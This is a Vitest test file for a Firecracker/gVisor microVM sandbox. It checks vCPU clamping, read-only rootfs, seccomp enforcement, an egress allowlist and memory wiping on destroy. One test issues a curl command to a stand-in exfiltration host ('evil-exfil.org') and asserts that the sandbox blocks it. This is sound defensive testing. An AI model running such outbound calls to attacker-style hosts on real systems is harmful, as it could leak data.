import { describe, it, expect } from 'vitest';
import { MicroVMSandbox } from '../src/index.js';

describe('Phase 10: Firecracker MicroVM & gVisor Runtime Suite', () => {
  it('constructs hardened Firecracker manifest with read-only rootfs and SMT disabled', () => {
    const vm = new MicroVMSandbox({
      jobId: 'job-fc-001',
      backend: 'FIRECRACKER',
      vcpuCount: 8, // Exceeds MAX_VCPU=4 -> clamped
      memSizeMib: 2048,
    });

    const manifest = vm.getManifest();
    expect(manifest['machine-config'].vcpu_count).toBe(4);
    expect(manifest['machine-config'].smt).toBe(false);
    expect(manifest.bootTimeTargetMs).toBe(125);
    expect(manifest.drives[0]?.is_root_device).toBe(true);
    expect(manifest.drives[0]?.is_read_only).toBe(true);
    expect(manifest.seccompLevel).toBe(2);
  });

  it('rejects insecure seccomp levels below 2', () => {
    expect(() => new MicroVMSandbox({ jobId: 'insecure', seccompLevel: 1 })).toThrow(
      'Security Violation'
    );
  });

  it('enforces guest egress allowlist and guarantees VM memory wipe on destroy', async () => {
    const vm = new MicroVMSandbox({
      jobId: 'job-fc-sec',
      egressAllowlist: ['minio.internal'],
    });

    const ok = await vm.executeCommand('npm', ['test']);
    expect(ok.exitCode).toBe(0);

    const blocked = await vm.executeCommand('curl', ['https://evil-exfil.org']);
    expect(blocked.exitCode).toBe(1);
    expect(blocked.stderr).toContain('Blocked non-allowlisted egress');

    await vm.destroy();
    expect(vm.isDestroyed()).toBe(true);
    expect(vm.isMemoryWiped()).toBe(true);

    await expect(vm.executeCommand('ls')).rejects.toThrow('terminated MicroVM');
  });
});
